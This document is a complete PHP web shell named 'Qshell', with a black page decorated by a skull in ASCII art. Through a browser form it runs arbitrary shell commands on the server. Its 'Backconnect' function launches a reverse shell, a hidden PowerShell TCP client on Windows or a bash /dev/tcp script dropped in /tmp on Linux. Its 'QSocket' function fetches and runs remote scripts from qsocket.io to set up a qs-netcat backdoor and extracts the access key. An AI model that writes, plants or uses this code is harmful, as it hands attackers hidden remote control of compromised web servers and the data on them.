<?php
error_reporting(0);
$result = '';
$windows = strtoupper(substr(PHP_OS, 0, 3)) === 'WIN';

if ($_POST) {
    $action = $_POST['a'] ?? '';

    if ($action == 'cmd') {
        $output = shell_exec(($_POST['c'] ?? '') . ' 2>&1');
        $result = preg_replace('/\033\[[0-9;]*[a-zA-Z]/', '', $output ?? '');
    }

    if ($action == 'back') {
        $host = $_POST['h'] ?? '';
        $port = $_POST['p'] ?? '';
        if ($windows) {
            $payload = "\$c=New-Object Net.Sockets.TcpClient('$host',$port);\$s=\$c.GetStream();[byte[]]\$b=0..65535|%{0};while((\$i=\$s.Read(\$b,0,\$b.Length))-ne 0){\$d=(New-Object Text.ASCIIEncoding).GetString(\$b,0,\$i);\$r=(iex \$d 2>&1|Out-String);\$r2=\$r+'PS '+(pwd).Path+'> ';\$sb=([text.encoding]::ASCII).GetBytes(\$r2);\$s.Write(\$sb,0,\$sb.Length);\$s.Flush()};\$c.Close()";
            pclose(popen("start /b powershell -NoP -W Hidden -C \"$payload\"", 'r'));
        } else {
            file_put_contents('/tmp/.r', "#!/bin/bash\nbash -i >& /dev/tcp/$host/$port 0>&1\n");
            shell_exec('chmod +x /tmp/.r && setsid nohup /tmp/.r >/dev/null 2>&1 &');
        }
        $result = "sent to $host:$port";
    }

    if ($action == 'qso') {
        if ($windows) {
            $data = shell_exec('powershell -Command "irm https://qsocket.io/1 | iex" 2>&1');
        } else {
            $temp = '/tmp/.setup.sh';
            shell_exec("curl -fsSL https://qsocket.io/0 -o $temp 2>/dev/null");
            $data = shell_exec("bash $temp 2>&1");
            @unlink($temp);
        }

        $data = preg_replace('/\033\[[0-9;]*[a-zA-Z]/', '', $data ?? '');
        $token = '';

        if (preg_match('/qs-netcat\s+-s\s+(\S+)/i', $data, $found)) {
            $token = trim($found[1], '"\'');
        } elseif (preg_match('/secret\s*[=:]\s*(\S+)/i', $data, $found)) {
            $token = trim($found[1], '"\'');
        } elseif (preg_match('/\-s\s+(\S+)/i', $data, $found)) {
            $token = trim($found[1], '"\'');
        } elseif (preg_match('/\.config\/\.(\S+)/i', $data, $found)) {
            $token = trim($found[1], '"\'');
        }

        if ($token) {
            $result = "qs-netcat -s $token -i";
        } else {
            $result = "[key not found]\n\n" . $data;
        }
    }
}
?>
<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>Qshell</title>
<style>
* { margin: 0; padding: 0; box-sizing: border-box; }
body { background: #000; color: #fff; font-family: monospace; height: 100vh; display: flex; flex-direction: column; padding: 12px; gap: 10px; }
.nav { display: flex; gap: 8px; flex-shrink: 0; }
button { background: #fff; color: #000; border: 0; padding: 8px 16px; cursor: pointer; font-family: monospace; font-weight: bold; }
button:hover { background: #ccc; }
form { display: none; flex-direction: column; gap: 8px; flex-shrink: 0; }
form.on { display: flex; }
input, textarea { background: #111; color: #fff; border: 1px solid #333; padding: 8px; font-family: monospace; font-size: 12px; }
textarea { height: 60px; resize: none; }
.wrap { flex: 1; position: relative; min-height: 0; }
.skull {
    position: absolute;
    inset: 0;
    display: flex;
    align-items: center;
    justify-content: center;
    white-space: pre;
    font-size: 16px;
    line-height: 1.2;
    color: #2a2a2a;
    overflow: hidden;
    pointer-events: none;
    user-select: none;
    letter-spacing: 1px;
}
.out {
    position: absolute;
    inset: 0;
    padding: 10px;
    overflow-y: auto;
    white-space: pre-wrap;
    font-size: 13px;
    word-break: break-all;
}
</style>
</head>
<body>

<div class="nav">
    <button onclick="show('t')">Terminal</button>
    <button onclick="show('b')">Backconnect</button>
    <button onclick="show('q')">QSocket</button>
</div>

<form id="t" class="on" method="POST">
    <textarea name="c" placeholder="$" autofocus></textarea>
    <button type="submit" name="a" value="cmd">Execute</button>
</form>

<form id="b" method="POST">
    <input name="h" placeholder="Host">
    <input name="p" placeholder="Port">
    <button type="submit" name="a" value="back">Connect</button>
</form>

<form id="q" method="POST">
    <button type="submit" name="a" value="qso">Run</button>
</form>

<div class="wrap">
    <div class="skull">                                _____  __
                      _,&lt;o` `'        '''`"Y=o.
                  _--'                         '"po
                 '                                 'Yo
            _.                                        'Y.
                                                        Ybo
         p'                                              Y88L
       d'                              ,od8bo.            888bp
      '                               d8888888b           88888b
    ]                                ]888888888[          Y88888b.
   ,P                                 888888888'          d8888888.
  ,P                                   YY888PP            88888888b
 ,P                                                      ,888888888b
 d'                                                      d8888888888[
,b                                                      d88888888888b
d[                                                     d8888888888888[
8'            ___,oo____                             d888888888888888b
b         _oo8888888888888oo_                     _o88888888888888888b
b       o888888888888888888888bo.__            ,od8888888888888888888b
b     d88888888888888888888888888888ooooooooo888888888888888888888888b
8[  ,8888888888888888888888888888888888888888888888888888888888888888b
][ d88888888888888888888888888888888888888888888888888888888888888888[
 bd88888888888888888888888888888888888888888888888888888888888888888P
 ]88888888888888P''  ``888888888888888888888888888888888888888888888[
  Y888888888888P        8888888888888888888888888888888888888888888P
   888888888888b        d88888888888888888888888888888888888888888P'
   `888888888888L      d88888888888888888888888888888888888888888P
     Y888888888888oooo888888888888888888888888888888888888888888P
      Y88888888888888888888888888888888888888888888888888888888P
       `Y8888888888888888888888888888888888888888888888888888P'
         "Y888888888888888888888888888888888888888888888888P'
           `P888888888888888888888888888888888888888888888'
             `Y8888888888888888888888888888888888888888P'
               ``Y8888888888888888888888888888888888P'
                   '"Y8888888888888888888888888PP"'
                       `'`YPY888888888888PP"`''
                                 `''</div>
    <div class="out"><?php echo htmlspecialchars($result); ?></div>
</div>

<script>
function show(id) {
    document.querySelectorAll('form').forEach(f => f.classList.remove('on'));
    document.getElementById(id).classList.add('on');
}
</script>
</body>
</html>
